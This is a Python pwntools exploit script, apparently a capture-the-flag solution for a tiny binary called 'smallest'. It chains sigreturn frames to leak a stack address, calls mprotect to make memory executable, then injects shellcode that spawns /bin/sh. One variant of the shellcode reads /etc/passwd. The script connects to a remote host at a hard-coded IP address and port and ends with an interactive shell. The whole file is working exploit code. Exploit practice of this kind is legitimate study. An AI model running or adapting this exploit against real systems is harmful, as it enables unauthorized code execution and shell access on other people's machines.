#! /usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *

context.clear()
context.arch = "amd64"
context.terminal = ['terminator', '-x', 'bash', '-c']
context.log_level = "debug"

frame = SigreturnFrame(kernel="amd64")
frame.rax = constants.SYS_read
frame.rdi = constants.STDIN_FILENO
frame.rdx = 0x400
frame.rip = 0x00000000004000be

#p = process("smallest")
p = remote("106.75.61.55", 20000)

p.send(p64(0x4000b0)+p64(0x00000000004000bb)+p64(0x4000b0))

#gdb.attach(p)
p.send("\xbb")
leak = p.recv()
print hex(u64(leak[16:24]))
frame.rsp = u64(leak[16:24]) - 0x1000
frame.rsi = u64(leak[16:24]) - 0x1000
p.send(p64(0x4000b0)+p64(0x4000be)+str(frame))
p.send(p64(0x4000be)+"a"*7)

shellcode_addr = 0x400000
shellcode = "hrve\x01\x814$\x01\x01\x01\x01H\xb8/etc/pasPj\x02XH\x89\xe71\xf6\x99\x0f\x05A\xba\xff\xff\xff\x7fH\x89\xc6j(Xj\x01_\x99\x0f\x05" # cat /etc/passwd
shellcode = "jhH\xb8/bin///sPj;XH\x89\xe71\xf6\x99\x0f\x05" # sh
shellcode = asm(shellcraft.amd64.sh())
frame.rax = constants.SYS_mprotect
frame.rdi = shellcode_addr
frame.rsi = 0x1000
frame.rdx = 7
p.send(p64(0x4000b0)+p64(0x4000be)+str(frame))

p.send(p64(0x4000be)+"a"*7)

frame.rax = constants.SYS_read
frame.rdi = constants.STDIN_FILENO
frame.rsi = 0x400100
frame.rdx = 100
p.send(p64(0x4000b0)+p64(0x4000be)+str(frame))

p.send(p64(0x4000be)+"a"*7)

p.send(shellcode)

p.send(p64(0x400100))
p.interactive()
